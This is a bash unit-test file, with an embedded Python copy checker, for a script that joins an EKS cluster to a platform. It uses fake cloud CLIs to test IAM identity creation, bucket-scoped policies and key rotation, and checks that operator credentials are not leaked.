#!/usr/bin/env bash
#
# Unit tests for adapter/internal/api/connect_bootstrap.sh. The script is not a
# library: it parses arguments and runs a join the moment it is sourced. So the
# tests lift its top-level function definitions into a file of their own and
# source that, with fake aws, eksctl, helm and kubectl on PATH.
# Most assignments here are inputs to the functions sourced below, and a
# linter reading only this file cannot see into them.
# shellcheck disable=SC2034

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
SCRIPT="${REPO_ROOT}/adapter/internal/api/connect_bootstrap.sh"

fail() {
  echo "FAIL: $*" >&2
  exit 1
}
pass() { echo "ok $*"; }

# Customer copy for the script a customer pipes into bash: echo and printf
# string arguments, the usage text, and the phase names. A command offered
# for copying keeps its real names, so it is not copy.
python3 - "${SCRIPT}" <<'PY'
import re
import sys

BANNED = re.compile(
    r"\bPMM\b|\bFlux\b|\b[Tt]he (?:hub|adapter)\b|\b[Tt]his (?:hub|adapter)\b|\b[Ss]pokes?\b"
)
CLUSTER = re.compile(r"(?i)\bclusters?\b")
INFRA = re.compile(r"(?i)(?:kubernetes|eks)\s+$")
PRINTED_COMMAND = re.compile(
    r"^\s*(?:"
    r"eksctl\s+(?:delete|create|get|utils|scale)\b|"
    r"aws\s+\S|"
    r"kubectl\s+\S|"
    r"helm\s+\S|"
    r"curl\s+\S|"
    r"for\b|"
    r"done\s*$"
    r")"
)


def problems(text):
    found = []
    for match in BANNED.finditer(text):
        found.append(match.group(0))
    for match in CLUSTER.finditer(text):
        start = match.start()
        if INFRA.search(text[:start]):
            continue
        if start > 0 and text[start - 1] in "-./":
            continue
        found.append(match.group(0))
    return found


def check_text(kind, text):
    if kind in ("echo", "printf") and PRINTED_COMMAND.match(text):
        return []
    return problems(text)


class Scanner:
    def __init__(self, src):
        self.src = src
        self.n = len(src)
        self.i = 0
        self.line = 1
        self.messages = []
        self.phases = []
        self.usages = []

    def peek(self, k=0):
        j = self.i + k
        return self.src[j] if j < self.n else ""

    def bump(self):
        if self.peek() == "\n":
            self.line += 1
        self.i += 1

    def scan(self):
        self.scan_until(None)

    def scan_until(self, stop):
        while self.i < self.n:
            if stop and self.peek() == stop:
                return
            before = self.i
            self.step()
            if self.i == before:
                if stop and self.peek() == stop:
                    return
                self.bump()

    def step(self):
        c = self.peek()
        if c == "":
            return
        if c == ")":
            return
        if c == "\n":
            self.bump()
            return
        if c == "#":
            while self.peek() not in "\n" and self.peek() != "":
                self.bump()
            return
        if c == "'":
            self.read_single()
            return
        if c == '"':
            self.read_double()
            return
        if c == "<" and self.peek(1) == "<" and self.peek(2) == "<":
            self.bump()
            self.bump()
            self.bump()
            return
        if c == "<" and self.peek(1) == "<":
            self.scan_heredoc()
            return
        if c == "$":
            self.skip_dollar()
            return
        if c.isalpha() or c == "_":
            word = self.read_word()
            if word in ("echo", "printf"):
                self.scan_args(word)
            elif word == "phase":
                self.scan_phase()
            return
        self.bump()

    def read_word(self):
        start = self.i
        while self.peek().isalnum() or self.peek() == "_":
            self.bump()
        return self.src[start : self.i]

    def read_single(self):
        self.bump()
        buf = []
        while self.i < self.n and self.peek() != "'":
            if self.peek() == "\n":
                self.line += 1
            buf.append(self.peek())
            self.bump()
        if self.peek() == "'":
            self.bump()
        return "".join(buf)

    def read_double(self):
        self.bump()
        buf = []
        while self.i < self.n:
            c = self.peek()
            if c == "\\":
                self.bump()
                if self.peek() == "":
                    break
                if self.peek() == "\n":
                    self.line += 1
                buf.append(self.peek())
                self.bump()
                continue
            if c == '"':
                self.bump()
                break
            if c == "$":
                start = self.i
                self.skip_dollar()
                buf.append(self.src[start : self.i])
                continue
            if c == "\n":
                self.line += 1
            buf.append(c)
            self.bump()
        return "".join(buf)

    def skip_dollar(self):
        if self.peek() != "$":
            return
        if self.peek(1) == "(" and self.peek(2) == "(":
            self.bump()
            depth = 0
            while self.i < self.n:
                ch = self.peek()
                if ch == "(":
                    depth += 1
                elif ch == ")":
                    depth -= 1
                    self.bump()
                    if depth == 0:
                        return
                    continue
                elif ch == "\n":
                    self.line += 1
                self.bump()
            return
        if self.peek(1) == "(":
            self.bump()
            self.bump()
            self.scan_until(")")
            if self.peek() == ")":
                self.bump()
            return
        if self.peek(1) == "{":
            self.bump()
            self.bump()
            depth = 1
            while self.i < self.n and depth > 0:
                ch = self.peek()
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                elif ch == "\n":
                    self.line += 1
                self.bump()
            return
        self.bump()
        while self.peek().isalnum() or self.peek() == "_":
            self.bump()

    def scan_args(self, cmd):
        while self.i < self.n:
            while self.peek() in " \t":
                self.bump()
            c = self.peek()
            if c in "\n;|&)" or c == "":
                return
            if c == ">" or (c == "<" and self.peek(1) not in "<("):
                return
            if c == "'":
                line = self.line
                text = self.read_single()
                self.messages.append((line, cmd, text))
                continue
            if c == '"':
                line = self.line
                text = self.read_double()
                self.messages.append((line, cmd, text))
                continue
            if c == "$":
                self.skip_dollar()
                continue
            if c == "\\":
                self.bump()
                if self.peek() == "\n":
                    self.line += 1
                if self.peek() != "":
                    self.bump()
                continue
            while self.peek() not in " \t\n;|&<>'\"$)" and self.peek() != "":
                self.bump()

    def scan_phase(self):
        while self.peek() in " \t":
            self.bump()
        if self.peek() not in "'\"":
            return
        line = self.line
        quote = self.peek()
        text = self.read_single() if quote == "'" else self.read_double()
        self.phases.append((line, text))

    def scan_heredoc(self):
        line_start = self.src.rfind("\n", 0, self.i) + 1
        self.bump()
        self.bump()
        if self.peek() == "-":
            self.bump()
        quote = ""
        if self.peek() in "'\"":
            quote = self.peek()
            self.bump()
        tag = ""
        while self.peek().isalnum() or self.peek() == "_":
            tag += self.peek()
            self.bump()
        if quote and self.peek() == quote:
            self.bump()
        while self.peek() not in "\n" and self.peek() != "":
            self.bump()
        intro = self.src[line_start : self.i]
        if self.peek() == "\n":
            self.bump()
        if tag == "":
            return
        is_usage = ">&2" in intro and re.search(r"\bcat\b", intro)
        while self.i < self.n:
            start = self.i
            start_line = self.line
            while self.peek() not in "\n" and self.peek() != "":
                self.bump()
            body = self.src[start : self.i]
            if body == tag:
                if self.peek() == "\n":
                    self.bump()
                return
            if is_usage:
                self.usages.append((start_line, body))
            if self.peek() == "\n":
                self.bump()


def require(cond, message):
    if not cond:
        print("FAIL: " + message, file=sys.stderr)
        sys.exit(1)


def fixture():
    bad = problems(
        "Pick a cluster, then ask the hub. This adapter lost the spoke, PMM, and Flux."
    )
    for want in ("cluster", "the hub", "This adapter", "spoke", "PMM", "Flux"):
        require(want in bad, "fixture did not reject " + want + ": " + repr(bad))
    require(
        problems("Use the Kubernetes cluster or the EKS clusters.") == [],
        "Kubernetes cluster or EKS cluster was rejected",
    )
    require(problems("The script is create-cluster.") == [], "create-cluster was rejected")
    require(
        problems("kubernetes.io/cluster/name") == [],
        "kubernetes.io/cluster was rejected",
    )
    command = "  eksctl delete cluster --name demo --region us-west-2"
    require(problems(command) != [], "a printed command was not a bare cluster before the exclusion")
    require(
        check_text("echo", command) == [],
        "a printed command was checked as copy",
    )
    require(
        check_text("echo", "Watch the hub for this cluster.") != [],
        "a fixture line with a bare cluster or the hub passed",
    )


def main():
    fixture()
    path = sys.argv[1]
    with open(path, encoding="utf-8") as fh:
        src = fh.read()
    scanner = Scanner(src)
    scanner.scan()
    require(len(scanner.phases) == 12, "expected 12 phase names, found %d" % len(scanner.phases))
    require(len(scanner.usages) >= 20, "usage text was not read")
    require(len(scanner.messages) >= 40, "echo and printf strings were not read")

    hits = []
    for line, _cmd, text in scanner.messages:
        for problem in check_text("echo", text):
            hits.append("%d: %s: %s" % (line, problem, text))
    for line, text in scanner.usages:
        for problem in check_text("usage", text):
            hits.append("%d usage: %s: %s" % (line, problem, text.strip()))
    for line, text in scanner.phases:
        for problem in check_text("phase", text):
            hits.append("%d phase: %s: %s" % (line, problem, text))
    if hits:
        print("FAIL: join script copy", file=sys.stderr)
        for hit in hits:
            print(hit, file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
PY
pass "join script copy"

WORK="$(mktemp -d)"
# Keep the status the suite died with. Cleaning up last used to overwrite it,
# so a run that aborted half way through still exited 0 and read as a pass.
cleanup_work() {
  local rc=$?
  rm -rf "${WORK}"
  exit "$rc"
}
trap cleanup_work EXIT

# Lift the top-level function definitions out. This has to know about
# heredocs: the bucket policy writes JSON whose closing brace sits in column
# one, and a naive extractor ends the function there and then loses every
# definition after it.
awk '
  heredoc != "" {
    print
    if ($0 == heredoc) { heredoc = "" }
    next
  }
  /^[a-z_0-9]+\(\) \{$/ { infunc = 1 }
  infunc {
    print
    if (match($0, /<<-?'"'"'?[A-Za-z_]+'"'"'?/)) {
      tag = substr($0, RSTART, RLENGTH)
      gsub(/^<<-?'"'"'?/, "", tag)
      gsub(/'"'"'$/, "", tag)
      heredoc = tag
      next
    }
    if ($0 == "}") { infunc = 0 }
  }
' "${SCRIPT}" >"${WORK}/functions.sh"

bash -n "${WORK}/functions.sh" || fail "extracted functions do not parse"

# shellcheck source=/dev/null
source "${WORK}/functions.sh"

FAKE="${WORK}/bin"
mkdir -p "${FAKE}"
PATH="${FAKE}:${PATH}"

record() { echo "$*" >>"${WORK}/calls"; }
export -f record
: >"${WORK}/calls"

cat >"${FAKE}/kubectl" <<EOF
#!/usr/bin/env bash
echo "kubectl \$*" >>"${WORK}/calls"
# Only "apply -f -" is fed on stdin. Draining it for anything else reads
# the caller's terminal and the test hangs.
if [[ "\$*" == *"-f -"* ]]; then
  cat >>"${WORK}/applied.yaml"
fi
if [[ "\$1" == "get" && "\$2" == "namespace" ]]; then
  ns="\$3"
  if [[ " \${FAKE_MISSING_NAMESPACES:-} " == *" \${ns} "* ]]; then
    echo "Error from server (NotFound): namespaces \"\${ns}\" not found" >&2
    exit 1
  fi
  exit 0
fi
if [[ "\$1" == "get" && "\$2" == "crd" ]]; then
  crd="\$3"
  if [[ " \${FAKE_MISSING_CRDS:-} " == *" \${crd} "* ]]; then
    echo "Error from server (NotFound): customresourcedefinitions.apiextensions.k8s.io \"\${crd}\" not found" >&2
    exit 1
  fi
  exit 0
fi
if [[ "\$*" == *"serviceAccountName"* ]]; then
  # The service account the agent Deployment runs as. "none" is a Deployment
  # the chart never made.
  if [[ "\${FAKE_AGENT_SA:-pds}" != "none" ]]; then
    printf '%s' "\${FAKE_AGENT_SA:-pds}"
  fi
  exit 0
fi
if [[ "\$*" == *"get deploy/"* ]]; then
  for d in source-controller kustomize-controller helm-controller; do
    if [[ "\$*" == *"deploy/\${d}"* && " \${FAKE_MISSING_DEPLOYS:-} " == *" \${d} "* ]]; then
      echo "Error from server (NotFound): deployments.apps \"\${d}\" not found" >&2
      exit 1
    fi
  done
  exit 0
fi
if [[ "\$1" == "apply" && "\$*" == *"-o name"* ]]; then
  printf '%s\n' "namespace/flux-system" "customresourcedefinition.apiextensions.k8s.io/gitrepositories.source.toolkit.fluxcd.io" "deployment.apps/source-controller"
  exit "\${FAKE_APPLY_RC:-0}"
fi
exit 0
EOF
chmod +x "${FAKE}/kubectl"

cat >"${FAKE}/aws" <<EOF
#!/usr/bin/env bash
echo "aws \$*" >>"${WORK}/calls"
# Walk a whitespace separated sequence one entry per call, so a wait loop can
# watch a status change. With no sequence set, every call reads the same
# value. The last entry repeats once the sequence runs out.
next_status() {
  local file="\$1" fallback="\$2" seq="\${3:-}" idx value
  if [[ -z "\$seq" ]]; then
    printf '%s' "\$fallback"
    return 0
  fi
  idx=0
  [[ -f "\$file" ]] && idx="\$(cat "\$file")"
  value="\$(printf '%s\n' \$seq | sed -n "\$((idx + 1))p")"
  if [[ -z "\$value" ]]; then
    value="\$(printf '%s\n' \$seq | tail -n 1)"
  else
    echo "\$((idx + 1))" >"\$file"
  fi
  printf '%s' "\$value"
}
case "\$*" in
  *"eks describe-cluster-versions"*)
    if [[ "\${FAKE_CLUSTER_VERSIONS_RC:-0}" != 0 ]]; then
      echo "Unknown options: describe-cluster-versions" >&2
      exit 255
    fi
    printf '%s\n' "\${FAKE_CLUSTER_VERSIONS:-1.33 1.35 1.34}"
    exit 0
    ;;
  *"eks describe-cluster"*"cluster.status"*)
    status="\$(next_status "${WORK}/cluster-status-idx" "\${FAKE_CLUSTER_STATUS:-ACTIVE}" "\${FAKE_CLUSTER_STATUS_SEQ:-}")"
    if [[ "\$status" == "ABSENT" ]]; then
      echo "ResourceNotFoundException: No cluster found" >&2
      exit 254
    fi
    if [[ "\$status" == "UNREADABLE" ]]; then
      echo "AccessDeniedException: not authorized to perform eks:DescribeCluster" >&2
      exit 254
    fi
    printf '%s\n' "\$status"
    exit 0
    ;;
  *"eks describe-nodegroup"*"nodegroup.status"*)
    ng=""
    prev=""
    for arg in \$@; do
      if [[ "\$prev" == "--nodegroup-name" ]]; then
        ng="\$arg"
      fi
      prev="\$arg"
    done
    status="\$(next_status "${WORK}/nodegroup-status-idx" "\${FAKE_NODEGROUP_STATUS:-ACTIVE}" "\${FAKE_NODEGROUP_STATUS_SEQ:-}")"
    if [[ -n "\${FAKE_MISSING_NODEGROUPS:-}" && " \${FAKE_MISSING_NODEGROUPS} " == *" \${ng} "* ]]; then
      status="ABSENT"
    fi
    if [[ "\$status" == "ABSENT" ]]; then
      echo "ResourceNotFoundException: No node group found" >&2
      exit 254
    fi
    printf '%s\n' "\$status"
    exit 0
    ;;
  *"cloudformation describe-stack-events"*)
    stack=""
    prev=""
    for arg in "\$@"; do
      if [[ "\$prev" == "--stack-name" ]]; then
        stack="\$arg"
      fi
      prev="\$arg"
    done
    if [[ -n "\${FAKE_STACK_EVENTS:-}" && "\$stack" == "\${FAKE_STACK_EVENTS_NAME:-\$stack}" ]]; then
      printf '%s\n' "\${FAKE_STACK_EVENTS}"
      exit 0
    fi
    echo "ValidationError: Stack does not exist" >&2
    exit 254
    ;;
  *"cloudformation describe-stacks"*)
    stack=""
    prev=""
    for arg in "\$@"; do
      if [[ "\$prev" == "--stack-name" ]]; then
        stack="\$arg"
      fi
      prev="\$arg"
    done
    # One answer that is neither found nor absent, such as a throttled call.
    if [[ -n "\${FAKE_STACK_ERR_ONCE:-}" && ! -f "${WORK}/stack-err-done" ]]; then
      touch "${WORK}/stack-err-done"
      echo "An error occurred (AccessDenied) when calling the DescribeStacks operation" >&2
      exit 254
    fi
    # A stack eksctl created during this test, by exact name.
    if [[ -f "${WORK}/fake-stacks" ]] && grep -qx -- "\$stack" "${WORK}/fake-stacks"; then
      echo "CREATE_COMPLETE"
      exit 0
    fi
    if [[ "\${FAKE_STACK_STATUS:-ABSENT}" == "ABSENT" ]]; then
      echo "ValidationError: Stack does not exist" >&2
      exit 254
    fi
    printf '%s\n' "\${FAKE_STACK_STATUS}"
    exit 0
    ;;
  *"eks describe-cluster"*"--output json"*)
    cat <<'JSON'
{"cluster":{"resourcesVpcConfig":{"vpcId":"vpc-1","clusterSecurityGroupId":"sg-1","subnetIds":["subnet-1"]}}}
JSON
    exit 0
    ;;
  *"ec2 describe-subnets"*)
    cat <<'JSON'
{"Subnets":[{"SubnetId":"subnet-1","AvailabilityZone":"us-west-2a","MapPublicIpOnLaunch":false}]}
JSON
    exit 0
    ;;
  *"head-bucket"*)
    bucket=""
    prev=""
    for arg in \$@; do
      if [[ "\$prev" == "--bucket" ]]; then
        bucket="\$arg"
      fi
      prev="\$arg"
    done
    if [[ -n "\${FAKE_EXISTING_BUCKETS:-}" ]]; then
      case " \${FAKE_EXISTING_BUCKETS} " in
        *" \${bucket} "*) exit 0 ;;
      esac
      exit 1
    fi
    exit "\${FAKE_HEAD_BUCKET_RC:-1}"
    ;;
  *"put-bucket-tagging"*)
    exit "\${FAKE_PUT_TAGGING_RC:-0}"
    ;;
  *"create-bucket"*)
    if [[ -n "\${FAKE_CREATE_BUCKET_ERR:-}" ]]; then
      echo "\${FAKE_CREATE_BUCKET_ERR}" >&2
      exit 1
    fi
    exit 0
    ;;
  *"get-caller-identity"*"--query Account"*)
    echo "\${FAKE_AWS_ACCOUNT:-123456789012}"
    exit 0
    ;;
  *"get-caller-identity"*)
    echo "{\"Arn\":\"arn:aws:iam::\${FAKE_AWS_ACCOUNT:-123456789012}:user/dev\",\"Account\":\"\${FAKE_AWS_ACCOUNT:-123456789012}\"}"
    exit 0
    ;;
  *"iam get-user-policy"*)
    if [[ -n "\${FAKE_USER_POLICIES:-}" ]]; then
      user=""
      policy=""
      prev=""
      for arg in \$@; do
        if [[ "\$prev" == "--user-name" ]]; then
          user="\$arg"
        fi
        if [[ "\$prev" == "--policy-name" ]]; then
          policy="\$arg"
        fi
        prev="\$arg"
      done
      case " \${FAKE_USER_POLICIES} " in
        *" \${user}:\${policy} "*) exit 0 ;;
      esac
      exit 1
    fi
    exit "\${FAKE_GET_USER_POLICY_RC:-0}"
    ;;
  *"iam list-user-tags"*)
    if [[ -n "\${FAKE_USER_TAGS:-}" ]]; then
      user=""
      prev=""
      for arg in \$@; do
        if [[ "\$prev" == "--user-name" ]]; then
          user="\$arg"
        fi
        prev="\$arg"
      done
      for pair in \${FAKE_USER_TAGS}; do
        if [[ "\${pair%%:*}" == "\$user" ]]; then
          echo "\${pair#*:}"
          exit 0
        fi
      done
      echo ""
      exit 0
    fi
    echo "\${FAKE_IAM_TAGS:-}"
    exit 0
    ;;
  *"iam get-user "*)
    if [[ -n "\${FAKE_EXISTING_USERS:-}" ]]; then
      user=""
      prev=""
      for arg in \$@; do
        if [[ "\$prev" == "--user-name" ]]; then
          user="\$arg"
        fi
        prev="\$arg"
      done
      case " \${FAKE_EXISTING_USERS} " in
        *" \${user} "*) exit 0 ;;
      esac
      exit 1
    fi
    exit "\${FAKE_GET_USER_RC:-1}"
    ;;
  *"iam create-user"*)
    if [[ -n "\${FAKE_CREATE_USER_ERR:-}" ]]; then
      echo "\${FAKE_CREATE_USER_ERR}" >&2
      exit 1
    fi
    exit 0
    ;;
  *"iam list-access-keys"*)
    echo "\${FAKE_EXISTING_KEYS:-}"
    exit 0
    ;;
  *"iam create-access-key"*)
    echo '{"AccessKey":{"AccessKeyId":"AKIAMINTED0000000000","SecretAccessKey":"minted-secret-value"}}'
    exit 0
    ;;
  *"iam list-roles"*)
    echo "\${FAKE_IAM_ROLES:-}"
    exit 0
    ;;
  *"iam get-role"*)
    echo "\${FAKE_CSI_ROLE_ARN:-arn:aws:iam::123456789012:role/AmazonEKS_EBS_CSI_DriverRole_spoke-a}"
    exit 0
    ;;
  *"eks list-nodegroups"*)
    echo "\${FAKE_NODEGROUPS:-ng-1}"
    exit 0
    ;;
  *"ec2 describe-regions"*)
    if [[ "\${FAKE_DESCRIBE_REGIONS_RC:-0}" != 0 ]]; then
      echo "AccessDeniedException: not authorized to perform ec2:DescribeRegions" >&2
      exit "\${FAKE_DESCRIBE_REGIONS_RC}"
    fi
    printf '%s\n' "\${FAKE_REGIONS:-us-west-2 us-east-1 eu-central-1 eu-west-1}"
    exit 0
    ;;
  *"configure get region"*)
    if [[ -n "\${FAKE_CONFIGURED_REGION:-}" ]]; then
      printf '%s\n' "\${FAKE_CONFIGURED_REGION}"
    fi
    exit 0
    ;;
  *"eks describe-nodegroup"*)
    ng=""
    prev=""
    for arg in \$@; do
      if [[ "\$prev" == "--nodegroup-name" ]]; then
        ng="\$arg"
      fi
      prev="\$arg"
    done
    if [[ -n "\${FAKE_MISSING_NODEGROUPS:-}" && " \${FAKE_MISSING_NODEGROUPS} " == *" \${ng} "* ]]; then
      exit 1
    fi
    echo "\${FAKE_NODE_ROLE_ARN:-arn:aws:iam::123456789012:role/eksctl-spoke-a-nodegroup-ng-1-NodeInstanceRole-XXXX}"
    exit 0
    ;;
esac
exit 0
EOF
chmod +x "${FAKE}/aws"

cat >"${FAKE}/eksctl" <<EOF
#!/usr/bin/env bash
echo "eksctl \$*" >>"${WORK}/calls"
# An iamserviceaccount is a CloudFormation stack named from its cluster,
# namespace and name, so the fake aws can report it present afterwards.
if [[ "\$*" == *"create iamserviceaccount"* ]]; then
  cluster=""
  ns=""
  name=""
  prev=""
  for arg in "\$@"; do
    case "\$prev" in
      --cluster) cluster="\$arg" ;;
      --namespace) ns="\$arg" ;;
      --name) name="\$arg" ;;
    esac
    prev="\$arg"
  done
  echo "eksctl-\${cluster}-addon-iamserviceaccount-\${ns}-\${name}" >>"${WORK}/fake-stacks"
fi
exit "\${FAKE_EKSCTL_RC:-0}"
EOF
chmod +x "${FAKE}/eksctl"

# The harness lifts the script's function definitions but not the top level
# assignments above them, so every global those functions read is declared
# here. The waits and retries are set to zero so the suite does not sleep.
HUB_URL="http://localhost:9"
ON_FAILURE="keep"
INTERRUPTED=0
CREATED_CSI_STACK=0
LOCAL=0
PUBLIC_NODES=0
NODES=3
NODE_TYPE="t3.2xlarge"
NODEGROUP="ng-1"
KUBERNETES_VERSION=""
PLATFORM_RELEASE="pds"
FLUX_VERSION="2.5.1"
STATUS_ONLY=0
DRY_RUN=0
CLUSTER_CREATE_TIMEOUT="40m"
CLUSTER_DELETE_TIMEOUT="45m"
WAIT_INTERVAL=0
CLUSTER_WAIT_TIMEOUT=2400
NODEGROUP_WAIT_TIMEOUT=1200
READY_NODE_TIMEOUT=600
RETRY_DELAY=0
WAIT_STATUS=""
PHASE=""
PHASE_LAST=""
PHASE_NUMBER=0
PHASE_TOTAL=7
RUN_STARTED=0
XDG_STATE_HOME="${WORK}/state"

# --- the spoke gets its own IAM identity, never the operator's ---
tmp="${WORK}"
PLATFORM_NAMESPACE="everest-system"
NAME="spoke-a"
REGION="us-west-2"

# The operator is signed in with a temporary SSO credential, which is the
# normal case and used to be copied straight into the customer's cluster.
AWS_ACCESS_KEY_ID="ASIAOPERATORSESSION0"
AWS_SECRET_ACCESS_KEY="operator-session-secret"
AWS_SESSION_TOKEN="operator-session-token"

: >"${WORK}/calls"
ensure_spoke_identity "pds-spoke-a" >/dev/null
grep -q "iam create-user --user-name pds-spoke-a" "${WORK}/calls" \
  || fail "ensure_spoke_identity did not create a per-cluster IAM user"
grep -q "Key=managed-by,Value=pds" "${WORK}/calls" \
  || fail "ensure_spoke_identity did not tag the IAM user it created"
pass "ensure_spoke_identity creates one IAM user per cluster"

grep -q "from-file=AWS_ACCESS_KEY_ID=" "${WORK}/calls" \
  || fail "the spoke secret did not load the minted key from a file: $(cat "${WORK}/calls")"
grep -q "from-file=AWS_SECRET_ACCESS_KEY=" "${WORK}/calls" \
  || fail "the spoke secret did not load the minted secret from a file"
grep -q "minted-secret-value" "${WORK}/calls" \
  && fail "the minted secret was passed on the kubectl command line: $(cat "${WORK}/calls")"
pass "ensure_spoke_identity writes the minted key"

# The whole point: the operator's own credential must not reach the cluster.
grep -q "ASIAOPERATORSESSION0" "${WORK}/calls" \
  && fail "the operator's access key reached the spoke"
grep -q "operator-session-secret" "${WORK}/calls" \
  && fail "the operator's secret reached the spoke"
grep -q "operator-session-token" "${WORK}/calls" \
  && fail "the operator's session token reached the spoke"
pass "ensure_spoke_identity never writes the operator's credentials"

# A temporary operator session is fine now, because it is only used to call
# IAM and S3. Connect keeps working for anyone signed in with SSO.
pass "a temporary operator session no longer blocks Connect"

# --- the identity is scoped to this cluster's bucket ---
scoped="$(cat "${WORK}/spoke-policy.json")"
[[ "${scoped}" == *'"arn:aws:s3:::pds-spoke-a"'* ]] \
  || fail "the policy does not name the bucket: ${scoped}"
[[ "${scoped}" == *'"arn:aws:s3:::pds-spoke-a/*"'* ]] \
  || fail "the policy does not name the bucket contents"
[[ "${scoped}" == *'"arn:aws:s3:::*"'* ]] \
  && fail "the policy grants every bucket"
[[ "${scoped}" == *'"s3:GetBucketLocation"'* ]] \
  || fail "the policy omits s3:GetBucketLocation: ${scoped}"
pass "the identity policy is scoped to one bucket"

# --- one cluster's identity reaches no other cluster's bucket ---
: >"${WORK}/calls"
ensure_spoke_identity "pds-spoke-dr" >/dev/null
policy="$(cat "${WORK}/spoke-policy.json")"
[[ "${policy}" == *"pds-spoke-dr"* ]] || fail "policy lost the cluster bucket"
[[ "${policy}" == *"pds-spoke-a"* ]] \
  && fail "the policy grants another cluster's bucket"
pass "the identity reaches this cluster's bucket only"

# --- repairing a cluster that already joined ---
# Re-running against an existing cluster is how a broken spoke is fixed, so the
# user already existing must converge rather than fail, and the two-key IAM
# limit must not bite on the second repair.
: >"${WORK}/calls"
FAKE_GET_USER_RC=0 FAKE_EXISTING_KEYS="AKIAOLD1 AKIAOLD2" \
  ensure_spoke_identity "pds-spoke-a" >/dev/null
grep -q "iam create-user" "${WORK}/calls" \
  && fail "ensure_spoke_identity recreated an existing user"
grep -q "iam create-access-key" "${WORK}/calls" \
  || fail "ensure_spoke_identity did not rotate the key"
line() { grep -n "$1" "${WORK}/calls" | head -1 | cut -d: -f1 || true; }
create_at="$(line "iam create-access-key")"
secret_at="$(line "from-file=AWS_ACCESS_KEY_ID=")"
old1_at="$(line "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAOLD1")"
old2_at="$(line "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAOLD2")"
[[ -n "$create_at" && -n "$secret_at" && -n "$old1_at" ]] \
  || fail "repair did not free a slot, mint, and write: $(cat "${WORK}/calls")"
[[ -z "$old2_at" ]] \
  || fail "the last old key was retired before the join finished: $(cat "${WORK}/calls")"
[[ "$old1_at" -lt "$create_at" ]] \
  || fail "the extra key was not freed before minting: $(cat "${WORK}/calls")"
[[ "$KEPT_ACCESS_KEY_ID" == "AKIAOLD2" ]] \
  || fail "the last old key was not kept for the success path: ${KEPT_ACCESS_KEY_ID:-empty}"
pass "re-running repairs an existing cluster and rotates its key"

: >"${WORK}/calls"
if (
  FAKE_GET_USER_RC=0 FAKE_GET_USER_POLICY_RC=1 FAKE_IAM_TAGS="" \
    ensure_spoke_identity "pds-spoke-a" >/dev/null 2>"${WORK}/unowned.err"
); then
  fail "ensure_spoke_identity adopted an unowned IAM user"
fi
grep -q "not a Connect backup user" "${WORK}/unowned.err" \
  || fail "no guidance for an unowned IAM user: $(cat "${WORK}/unowned.err")"
grep -q "iam create-access-key" "${WORK}/calls" \
  && fail "ensure_spoke_identity rotated keys on an unowned user"
pass "ensure_spoke_identity refuses an unowned IAM user"

: >"${WORK}/calls"
KEPT_ACCESS_KEY_ID=""
FAKE_GET_USER_RC=0 FAKE_EXISTING_KEYS="AKIAOLD1" \
  ensure_spoke_identity "pds-spoke-a" >/dev/null
create_at="$(line "iam create-access-key")"
secret_at="$(line "from-file=AWS_ACCESS_KEY_ID=")"
old1_at="$(line "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAOLD1")"
[[ -n "$create_at" && -n "$secret_at" ]] \
  || fail "a single existing key was not rotated: $(cat "${WORK}/calls")"
[[ -z "$old1_at" ]] \
  || fail "the previous key was deleted before the join finished: $(cat "${WORK}/calls")"
[[ "$KEPT_ACCESS_KEY_ID" == "AKIAOLD1" ]] \
  || fail "the previous key was not kept for the success path: ${KEPT_ACCESS_KEY_ID:-empty}"
pass "a single existing key stays valid until the join succeeds"

: >"${WORK}/calls"
KEPT_ACCESS_KEY_ID="AKIAOLD1"
retire_previous_backup_key
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAOLD1" "${WORK}/calls" \
  || fail "retire_previous_backup_key did not delete the kept key: $(cat "${WORK}/calls")"
[[ -z "${KEPT_ACCESS_KEY_ID:-}" ]] \
  || fail "retire_previous_backup_key left KEPT_ACCESS_KEY_ID set"
pass "retire_previous_backup_key deletes the previous key after success"

# --- an operator without IAM rights is told what to do ---
: >"${WORK}/calls"
if (
  FAKE_GET_USER_RC=1 FAKE_CREATE_USER_ERR="AccessDenied" \
    ensure_spoke_identity "pds-spoke-a" >/dev/null 2>"${WORK}/iam.err"
); then
  fail "ensure_spoke_identity ignored an IAM failure"
fi
grep -q "iam:CreateUser" "${WORK}/iam.err" \
  || fail "no guidance for a missing IAM permission: $(cat "${WORK}/iam.err")"
pass "a missing IAM permission says which one"

# --- a pre-made key skips IAM entirely ---
: >"${WORK}/calls"
BACKUP_ACCESS_KEY_ID="AKIASUPPLIED00000000" \
  BACKUP_SECRET_ACCESS_KEY="supplied-secret" \
  ensure_spoke_identity "pds-spoke-a" >/dev/null
grep -q "iam create-user" "${WORK}/calls" && fail "a supplied key still called IAM"
grep -q "from-file=AWS_ACCESS_KEY_ID=" "${WORK}/calls" \
  || fail "the supplied key was not written"
grep -q "AKIASUPPLIED00000000" "${WORK}/calls" \
  && fail "the supplied key leaked onto the kubectl argv: $(cat "${WORK}/calls")"
pass "a supplied backup key skips IAM"

: >"${WORK}/calls"
if (
  BACKUP_ACCESS_KEY_ID="ASIASUPPLIED00000000" \
    BACKUP_SECRET_ACCESS_KEY="supplied-secret" \
    ensure_spoke_identity "pds-spoke-a" >/dev/null 2>"${WORK}/asia.err"
); then
  fail "ensure_spoke_identity accepted a temporary backup key"
fi
grep -q "temporary" "${WORK}/asia.err" \
  || fail "no explanation for a temporary backup key: $(cat "${WORK}/asia.err")"
grep -q "iam create-user" "${WORK}/calls" \
  && fail "a temporary supplied key still called IAM"
pass "a temporary supplied backup key is rejected"
unset BACKUP_ACCESS_KEY_ID BACKUP_SECRET_ACCESS_KEY

# --- no session token is ever written ---
grep -q "AWS_SESSION_TOKEN" "${WORK}/calls" \
  && fail "a session token reached the spoke secret"
pass "the spoke secret carries no session token"

# --- the credential reaches the namespace BackupStorage reads ---
# A BackupStorage lives in pds and its credentialsSecretRef names
# no namespace, so it resolves there. The credential is written to the Helm
# namespace, and the copy across used to sit in a helper only a restoring join
# called. An ordinary join left them in different namespaces.
: >"${WORK}/calls"
PLATFORM_NAMESPACE="everest-system"
mirror_s3_secret >/dev/null 2>&1
grep -q "kubectl -n pds create secret generic pds-s3" "${WORK}/calls" \
  || fail "mirror_s3_secret did not copy the credential into pds"
